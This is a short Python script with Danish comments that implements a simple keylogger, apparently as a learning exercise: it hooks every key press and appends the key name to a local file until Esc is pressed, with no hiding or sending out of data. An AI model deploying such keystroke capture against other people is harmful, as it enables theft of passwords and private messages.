import keyboard
from time import sleep


def wipe_log():
    with open('tastelog.txt', 'w') as file:     # 'w' for write, så den åbner filen og overskriver det der er i den og wiper den. 
        file.write("")

def keylog(strokes):
    with open('tastelog.txt', 'a') as file:     # 'a' for append, fordi funktionen basically fungerer som et while True loop, og efter hver key press åbner den .txt filen og skriver det ned, så 'a' for append er nødvendigt, ellers ville den wipe det hver gang
        file.write(str(strokes.name))
    
wipe_log()
keyboard.on_press(keylog)
keyboard.wait('esc')

